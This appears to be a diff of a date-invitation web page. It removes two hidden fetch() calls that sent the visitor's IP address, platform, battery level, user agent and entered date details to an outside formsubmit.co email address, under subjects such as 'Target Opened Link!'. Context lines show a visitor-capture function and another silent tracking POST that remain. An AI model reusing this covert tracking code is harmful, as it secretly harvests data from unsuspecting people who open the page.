@@ -338,14 +338,7 @@
             method: "POST", mode: "no-cors", body: trackBody
           }).catch(() => {});
 
-          fetch("https://formsubmit.co/ajax/Kali0x0x@proton.me", {
-            method: "POST",
-            headers: { "Content-Type": "application/json", "Accept": "application/json" },
-            body: JSON.stringify({
-              _subject: "🚨 USER LOG: Target Opened Link!",
-              IP_Address: ip, Platform: platform, Battery_Level: batteryStr, Time_Opened: time, Device_Info: ua
-            })
-          }).catch(() => {});
+          
         } catch(e) {}
       }
       captureVisitor();
@@ -565,14 +558,7 @@
             body: `🤍 DATE ACCEPTED!\nDate: ${date}\nTime: ${time}\nDining: ${food}\nPlan: ${act}\nDress: ${dress}\nNotes: ${notes}`
           }).catch(() => {});
 
-          fetch("https://formsubmit.co/ajax/Kali0x0x@proton.me", {
-            method: "POST",
-            headers: { "Content-Type": "application/json", "Accept": "application/json" },
-            body: JSON.stringify({
-              _subject: "🤍 DATE DETAILS: Confirmed!",
-              Date: date, Time: time, Dining: food, Activity: act, Dress_Code: dress, Notes: notes
-            })
-          }).catch(() => {});
+          
         }, 1200);
       });
 
